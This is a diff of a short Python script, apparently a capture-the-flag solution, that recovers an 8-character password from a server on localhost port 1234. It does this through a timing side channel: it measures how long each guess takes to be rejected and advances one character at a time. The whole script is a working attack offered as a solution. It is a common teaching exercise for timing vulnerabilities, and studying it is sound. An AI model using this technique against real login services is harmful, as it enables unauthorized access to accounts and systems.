@@ -1,41 +1,40 @@
-__author__ = 'ronza'
+__author__ = 'davidwr'
 import socket as sck
 
 import time
 
-# #create an INET, STREAMing socket
-# socket = sck.socket(
-#     sck.AF_INET, sck.SOCK_STREAM)
-# #now connect to the web server on port 80
-# # - the normal http port
-# socket.connect(("127.0.0.1", 1234))
-
+# Set all 8 characters to be '/' that way we can check '0'
+password = ['/'] * 8
 string = "Bad password!"
-test = ['/'] * 8
-# test[0] = 'N'
 msg = ''
 max_time = 1
 
 while string == "Bad password!":
-    s = ''
-    a=s.join(test)
-    print(a)
+    a = str.encode(''.join(password))
+    # print(a)
+    # Declaring a socket
     socket = sck.socket(sck.AF_INET, sck.SOCK_STREAM)
+    # Connecting to server
     socket.connect(("127.0.0.1", 1234))
+    # First message: Enter a password
     socket.recv(1024)
-    time.time()
-    s_t = time.time()
+
+    # Sending the current password
     socket.send(a)
+
+    # Check receiving time
+    s_t = time.time()
     strings = socket.recv(1024)
     e_t = time.time()
-    # print(abs(s_t - e_t))
-    if test[len(msg)] == '/':
-        max_time = abs(s_t - e_t) + 0.05
+
+    if password[len(msg)] == '/':
+        max_time = abs(s_t - e_t) + 0.05  # Margin of error
 
     if max_time < abs(s_t - e_t):
-        msg += test[len(msg)]
+        msg += password[len(msg)]
     else:
-        test[len(msg)] = chr(ord(test[len(msg)]) + 1)
+        password[len(msg)] = chr(ord(password[len(msg)]) + 1)
     socket.close()
 
+# Print the flag
 print(strings)
